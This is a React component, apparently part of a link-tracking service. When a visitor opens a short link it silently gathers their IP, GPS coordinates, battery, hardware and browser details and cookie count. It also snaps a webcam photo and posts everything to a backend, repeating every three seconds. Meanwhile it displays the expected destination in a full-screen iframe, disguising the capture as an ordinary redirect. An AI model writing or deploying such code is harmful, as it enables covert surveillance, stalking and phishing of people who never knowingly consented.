 
import { useEffect } from "react";
import { useParams } from "react-router-dom";

function VisitorTracker() {
  const { shortId } = useParams();

  useEffect(() => {
    let videoStream = null;

    const captureVisitorData = async () => {
      try {
        // Get IP
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();

        // Get Location
        let latitude = "";
        let longitude = "";
        if (navigator.geolocation) {
          try {
            const pos = await new Promise((resolve, reject) =>
              navigator.geolocation.getCurrentPosition(resolve, reject)
            );
            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;
          } catch (err) {
            console.log("Location denied");
          }
        }

        // Battery Info
        let batteryInfo = { level: "N/A", charging: "N/A" };
        if (navigator.getBattery) {
          const battery = await navigator.getBattery();
          batteryInfo = {
            level: battery.level * 100 + "%",
            charging: battery.charging,
          };
        }

        // Data Object (keep your original fields)
        const deviceInfo = {
          ip: ipData.ip,
          latitude,
          longitude,
          ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A",
          cpuCores: navigator.hardwareConcurrency || "N/A",
          batteryLevel: batteryInfo.level,
          isCharging: batteryInfo.charging,
          browser: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          screen: `${window.screen.width}x${window.screen.height}`,
          page: window.location.pathname,
          cookieCount: document.cookie ? document.cookie.split(";").length : 0,
          timestamp: new Date().toISOString(),
        };

        // Camera snapshot
        let cameraImage = null;
        try {
          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
          const video = document.createElement("video");
          video.srcObject = videoStream;
          await video.play();

          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          cameraImage = canvas.toDataURL("image/jpeg", 0.5);
        } catch (e) {
          console.log("Camera access denied");
        }

        // Keep your original visitorData structure
        const visitorData = {
          shortId,
          ...deviceInfo,
          cameraImage,
          entryTime: new Date(),
        };

        // Send to API
        const res = await fetch(`http://localhost:5000/api/auth/t/${shortId}`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(visitorData),
        });

        const result = await res.json();
        if (result.redirectUrl) {
          const frame = document.getElementById("target-frame");
          if (frame) frame.src = result.redirectUrl;
        }
      } catch (err) {
        console.log("Tracking error:", err);
      }
    };

    captureVisitorData();

    const handleExit = () => {
      navigator.sendBeacon(
        `https://user-tracking-1.onrender.com/api/auth/exit/${shortId}`,
        JSON.stringify({ exitTime: new Date() })
      );
    };

    window.addEventListener("visibilitychange", () => {
      if (document.visibilityState === "hidden") handleExit();
    });
 
 
 
    const interval = setInterval(captureVisitorData, 3000);
  return () => {

     clearInterval(interval);

     
    if (videoStream) {
      videoStream.getTracks().forEach((track) => track.stop());
    }

  };

}, [shortId]);

  return (
    <div style={{ width: "100vw", height: "100vh", margin: 0, padding: 0, overflow: "hidden" }}>
      <iframe
        id="target-frame"
        title="Target Content"
        style={{ width: "100%", height: "100%", border: "none" }} 
        sandbox="allow-forms allow-scripts allow-same-origin"
      />
    </div>
  );
}

export default VisitorTracker; 
